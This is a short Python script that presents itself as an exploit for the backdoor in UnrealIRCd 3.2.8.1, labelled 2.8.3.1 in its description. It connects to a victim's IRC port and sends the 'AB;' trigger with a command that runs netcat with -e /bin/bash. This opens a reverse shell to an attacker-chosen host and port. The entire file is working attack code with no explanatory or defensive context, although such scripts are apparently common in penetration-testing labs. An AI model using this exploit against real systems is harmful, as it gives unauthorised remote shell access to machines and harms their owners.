#!/usr/bin/python

import socket
import argparse

parser = argparse.ArgumentParser(description='UnrealIRCD 2.8.3.1 Backdoor Exploit')
parser.add_argument('-rh', '--rhost', help="IP of the victim")
parser.add_argument('-lh', '--lhost', help="IP of the Attacker")
parser.add_argument('-lp', '--lport', help="Port of the netcat Listener")
parser.add_argument('-rp', '--rport', help="Port of unrealIRCD")
arg = parser.parse_args()

sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sockfd.connect((arg.rhost, int(arg.rport)))
sockfd.recv(2048)
sockfd.send("AB; sh -c '(nc " + arg.lhost + " " + arg.lport + " -e /bin/bash) '\n")
sockfd.close()
